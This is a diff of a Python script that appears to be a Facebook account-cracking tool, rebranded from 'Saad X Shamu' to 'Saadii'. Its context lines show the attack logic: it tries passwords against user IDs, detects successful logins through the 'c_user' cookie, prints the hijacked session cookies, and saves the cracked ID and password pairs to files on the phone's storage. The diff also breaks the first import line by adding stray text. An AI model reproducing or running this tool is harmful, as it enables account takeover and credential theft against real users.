@@ -1,4 +1,4 @@
-import os,sys,time,json,random,re,string,platform,base64,uuid
+seeimport os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
@@ -77,11 +77,11 @@ for xd in range(10000):
 logo = ("""\033[1;32m
 
  _____                 _ 
-  / ____|               | |
- | (___   __ _  __ _  __| |
-  \___ \ / _` |/ _` |/ _` |
-  ____) | (_| | (_| | (_| |
- |_____/ \__,_|\__,_|\__,_|
+  / ____|               | ||
+ | (___   __ _  __ _  __| ||
+  \___ \ / _` |/ _` |/ _` ||
+  ____) | (_| | (_| | (_| ||
+ |_____/ \__,_|\__,_|\__,_||
                                                                                                 
 ╔═════════════════════════════════════════════╗
 ║  [+] AUTHOR   : SAADII 😘      ║
@@ -246,23 +246,23 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[Saad X Shamu-OK💛] {uid}|{ps}")
+                print(f"\033[38;5;46m[Saadii-OK💛] {uid}|{ps}")
                 print(f" \n Cookie : {coki}")
                 print(f" \n ══════════════════════════════════════════")
-                open('/sdcard/saad x shamu/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/saadii/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[Saad X Shamu-CP🔒] {uid}|{ps}")
-                open('/sdcard/Saad X Shamu-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m[Saadii-CP🔒] {uid}|{ps}")
+                open('/sdcard/Saadii-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[Saad x Shamu💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[Saadii💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
